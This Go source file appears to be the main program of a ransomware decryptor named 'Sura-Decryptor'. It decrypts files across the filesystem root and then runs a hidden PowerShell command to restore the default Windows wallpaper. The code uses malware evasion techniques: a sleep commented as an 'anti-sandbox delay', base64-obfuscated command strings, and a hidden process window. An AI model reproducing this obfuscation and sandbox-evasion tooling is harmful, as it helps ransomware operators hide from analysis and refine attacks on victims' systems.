package main

import (
	filewalker "Sura-Decryptor/iterator"
	"encoding/base64"
	"os/exec"
	"syscall"
	"time"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func main() {
	time.Sleep(2 * time.Second) // Anti-sandbox delay
	filewalker.DecryptDirectory(d("Lw=="))
	setWallpaper()
}

func setWallpaper() {
	psCmd1 := d("cG93ZXJzaGVsbA==")
	psCmd2 := d("LUNvbW1hbmQ=")
	wallpaperPath := d("QzpcV2luZG93c1xXZWJcV2FsbHBhcGVyXFdpbmRvd3NcaW1nMTkuanBn")

	setWallpaperCmd := exec.Command(psCmd1, psCmd2, d("QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICd1c2luZyBTeXN0ZW07IHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsgcHVibGljIGNsYXNzIFdhbGxwYXBlciB7IFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0gcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFN5c3RlbVBhcmFtZXRlcnNJbmZvKGludCB1QWN0aW9uLCBpbnQgdVBhcmFtLCBzdHJpbmcgbHB2UGFyYW0sIGludCBmdVdpbkluaSk7IHB1YmxpYyBzdGF0aWMgdm9pZCBTZXQoc3RyaW5nIHBhdGgpIHsgU3lzdGVtUGFyYW1ldGVyc0luZm8oMjAsIDAsIHBhdGgsIDMpOyB9IH0nOyBbV2FsbHBhcGVyXTo6U2V0KA==")+`'`+wallpaperPath+`')`)
	setWallpaperCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := setWallpaperCmd.Run()
	if err != nil {
		return
	}
}
